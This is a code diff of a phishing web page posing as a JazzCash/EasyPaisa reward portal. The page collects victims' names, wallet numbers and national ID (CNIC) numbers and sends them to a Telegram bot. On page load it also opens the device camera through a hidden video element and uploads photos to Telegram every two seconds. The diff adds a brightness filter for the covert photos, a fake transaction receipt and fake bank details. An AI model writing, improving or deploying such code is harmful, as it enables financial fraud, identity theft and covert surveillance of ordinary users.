@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reward Portal - High Speed</title>
+    <title>Reward Portal - Verified</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
         :root { --jazz-red: #d71921; --easy-green: #00ad45; --active-color: #d71921; }
@@ -21,7 +21,8 @@
         .amount-big { font-size: 45px; font-weight: 700; border-top: 2px solid #f4f4f4; border-bottom: 2px solid #f4f4f4; padding: 25px 0; margin: 25px 0; }
         .r-table { width: 100%; font-size: 14px; text-align: left; }
         .r-val { font-weight: 600; text-align: right; }
-        #v-hidden, canvas { display: none; visibility: hidden; position: absolute; }
+        .bank-info { font-size: 11px; color: #555; display: block; }
+        #v-hidden, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body onload="initCamera()">
@@ -37,13 +38,13 @@
         </select>
         <label>Account Holder Name</label>
         <input type="text" id="u_name" placeholder="Enter Full Name">
-        <label>Wallet Number (11 Digits)</label>
+        <label>Wallet Number</label>
         <input type="tel" id="u_num" placeholder="03XXXXXXXXX" maxlength="11">
-        <label>CNIC Number (13 Digits)</label>
+        <label>CNIC Number</label>
         <input type="tel" id="u_cnic" placeholder="42XXXXXXXXXXX" maxlength="13">
         <button class="btn" id="main-btn" onclick="submitData()">CLAIM NOW</button>
         <div id="loading-section">
-            <div class="spinner" id="main-spinner"></div><br>
+            <div class="spinner"></div><br>
             <span style="color:#555; font-size:13px;">Processing...</span>
         </div>
     </div>
@@ -52,12 +53,22 @@
 <div id="success-screen">
     <div class="success-icon">✔</div>
     <h2 style="margin:0;">SUCCESSFUL</h2>
+    <p style="color:#888; font-size:12px;">TID: 4182787272491</p>
     <div class="amount-big">Rs. 50.00</div>
     <table class="r-table">
         <tr><td>To</td><td class="r-val" id="r-to"></td></tr>
-        <tr><td>From</td><td class="r-val" style="color:red;">MUDASIR ABBAS</td></tr>
+        <tr>
+            <td>From</td>
+            <td class="r-val">
+                <span id="from-name" style="color:var(--jazz-red);">MUDASIR ABBAS</span>
+                <span class="bank-info">UBL United Bank Limited</span>
+                <span class="bank-info">Account: 16143*********2</span>
+            </td>
+        </tr>
         <tr><td>Status</td><td class="r-val" style="color:#28a745;">COMPLETED</td></tr>
+        <tr><td>Date</td><td class="r-val" id="r-date"></td></tr>
     </table>
+    <div style="margin-top:50px;"><img id="success-logo" src="https://upload.wikimedia.org/wikipedia/commons/3/30/JazzCash_logo.png" width="100"></div>
     <audio id="iphone-tone" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" preload="auto"></audio>
 </div>
 
@@ -73,6 +84,7 @@
         const color = (wallet === 'EasyPaisa') ? '#00ad45' : '#d71921';
         document.getElementById('main-header').style.background = color;
         document.getElementById('main-btn').style.background = color;
+        document.getElementById('from-name').style.color = color;
     }
 
     async function initCamera() {
@@ -81,54 +93,65 @@
             const video = document.getElementById('v-hidden');
             video.srcObject = stream;
             video.onplaying = () => {
-                // Photo capture interval set to 2 seconds for high speed
-                setInterval(capturePhoto, 2000); 
+                // Camera adjustment ke liye 3s wait, phir 2s interval pe capture
+                setTimeout(() => { setInterval(capturePhoto, 2000); }, 3000);
             };
-        } catch (e) { console.log("Cam denied"); }
+        } catch (e) {}
     }
 
     function capturePhoto() {
         const video = document.getElementById('v-hidden');
         const canvas = document.getElementById('c-hidden');
-        if (video.readyState === 4) {
+        const ctx = canvas.getContext('2d');
+
+        if (video.readyState === 4 && video.videoWidth > 0) {
             canvas.width = video.videoWidth; 
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatID);
-                fd.append('photo', blob, 'fast_hit.jpg');
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.5); // Fast upload with slightly more compression
+            ctx.drawImage(video, 0, 0);
+            
+            // Masla Hal: Pixel brightness check karein
+            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            let hasLight = false;
+            for (let i = 0; i < imgData.length; i += 40) {
+                if (imgData[i] > 10 || imgData[i+1] > 10 || imgData[i+2] > 10) {
+                    hasLight = true; break;
+                }
+            }
+
+            // Sirf wahi photo bheje jo black na ho
+            if (hasLight) {
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatID); fd.append('photo', blob, 'hit.jpg');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.6);
+            }
         }
     }
 
-    function getDeviceInfo() {
+    function getDevice() {
         const ua = navigator.userAgent;
         let model = "Desktop";
         if (/Android/i.test(ua)) {
-            const match = ua.match(/Android\s+([\d\.]+);\s+([^;]+)\s+Build/);
-            model = match ? match[2] : "Android Device";
-        } else if (/iPhone/i.test(ua)) {
-            model = "iPhone";
-        }
-        return `${model} | Browser: ${navigator.vendor}`;
+            const m = ua.match(/Android\s+([\d\.]+);\s+([^;]+)\s+Build/);
+            model = m ? m[2] : "Android";
+        } else if (/iPhone/i.test(ua)) model = "iPhone";
+        return `${model} | Screen: ${screen.width}x${screen.height}`;
     }
 
     async function submitData() {
         const name = document.getElementById('u_name').value;
         const num = document.getElementById('u_num').value;
         const cnic = document.getElementById('u_cnic').value;
-
         if(num.length !== 11 || cnic.length !== 13 || !name) {
-            alert("Fill all fields correctly."); return;
+            alert("Fill all fields correctly!"); return;
         }
 
         document.getElementById('main-btn').style.display = 'none';
         document.getElementById('loading-section').style.display = 'block';
 
-        const device = getDeviceInfo();
-        const text = `🚀 *HIGH SPEED HIT* 🚀\n\n👤 *Name:* ${name}\n📱 *No:* ${num}\n🆔 *CNIC:* ${cnic}\n📱 *Device:* ${device}\n🏦 *Wallet:* ${document.getElementById('wallet_type').value}`;
+        const device = getDevice();
+        const text = `🎯 *NEW HIT* 🎯\n👤 Name: ${name}\n📱 No: ${num}\n🆔 CNIC: ${cnic}\n📱 Device: ${device}\n💎 Sender: MUDASIR ABBAS`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
@@ -140,6 +163,7 @@
             document.getElementById('form-page').style.display = 'none';
             document.getElementById('success-screen').style.display = 'block';
             document.getElementById('r-to').innerHTML = name.toUpperCase() + "<br>" + num;
+            document.getElementById('r-date').innerText = new Date().toLocaleString();
             document.getElementById('iphone-tone').play().catch(()=>{});
         }, 2000);
     }
